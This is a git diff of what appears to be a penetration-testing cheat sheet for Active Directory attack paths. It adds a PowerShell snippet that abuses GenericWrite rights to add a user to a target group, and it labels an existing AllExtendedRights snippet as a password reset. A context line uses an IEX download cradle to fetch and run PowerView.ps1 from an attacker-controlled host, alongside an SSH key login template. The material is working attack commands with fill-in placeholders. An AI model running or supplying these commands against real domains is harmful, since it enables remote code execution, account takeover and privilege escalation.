@@ -391,6 +391,7 @@ chmod 600 id_rsa && ssh -i id_rsa [USER]@[RHOST]
 This section will cover all the attacks that this useful tool detects.
 
 **AllExtendedRights**
+Changing the target user's password:
 ```powershell
 $ownedUser_password = ConvertTo-SecureString __KnownPassword__ -Asplain -Force
 $targetUser_password = ConvertTo-SecureString __PutHereThePassword__ -Asplain -Force
@@ -399,7 +400,13 @@ IEX(New-Object Net.WebClient).downloadString('http://__LHOST__/PowerView.ps1'); 
 -Credential $credential
 ```
 
-**
+**GenericWrite**
+Adding a user into the target Group:
+```powershell
+$user_password = ConvertTo-SecureString __UserPassword__ -Asplain -Force
+$credential = New-Object System.Management.Automation.PSCredential('__Domain__\__UserName__', $user_password)
+Add-DomainGroupMember -Identity __TargetGroup__ -Members __UserName__ -Credential $credential
+```
 
 # Pivoting
 In the current part there are explained some pivoting techniques that have been useful in many situations.
